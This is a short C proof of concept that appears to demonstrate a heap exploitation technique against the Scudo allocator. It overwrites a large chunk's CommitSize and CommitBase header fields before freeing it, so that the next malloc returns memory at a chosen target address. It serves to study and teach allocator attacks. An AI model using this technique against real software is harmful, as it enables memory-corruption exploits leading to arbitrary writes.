#include <stdio.h>
#include <stdlib.h>

unsigned long big[0x2000] = {0};
char target[64];

int main() {
	unsigned long * bigChunk = malloc(0x20000);

	// CommitSize
	bigChunk[-7] = 0x20050;
	// CommitBase
	bigChunk[-8] = (unsigned long)target - 0x50;  // -0x50 here bc the LargeChunk::header + normal header are 0x50 bytes
												  // Cache.retrieve - HeaderPos >= CommitBase, so we need to add those 0x50 bytes, and offset them when we set CommitBase, to satisfy retrieve
												  // Target should be writeable, as well as the 0x50 bytes before hand

	free(bigChunk);
	unsigned long * forgedChunk = malloc(0x20000);

	printf("Address of target is %p\n", target);
	printf("Address of forged chunk is %p\n", forgedChunk);
}
